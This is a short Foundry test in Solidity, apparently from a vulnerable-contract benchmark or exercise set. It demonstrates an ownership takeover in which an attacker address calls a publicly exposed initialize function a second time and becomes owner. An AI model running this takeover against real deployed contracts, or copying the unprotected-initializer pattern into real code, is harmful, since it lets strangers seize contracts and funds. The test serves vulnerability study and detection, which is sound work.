// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_010_initializer_exposed is Test {
    function testExploit_ReinitializeOwnerTakeover() public {
        InitializerExposed c = new InitializerExposed();
        address admin = address(0xA11CE);
        address attacker = address(0xBEEF);

        c.initialize(admin);
        assertEq(c.owner(), admin);

        // attacker re-initializes and takes ownership
        vm.prank(attacker);
        c.initialize(attacker);
        assertEq(c.owner(), attacker, "owner takeover via public reinitialize");
    }
}
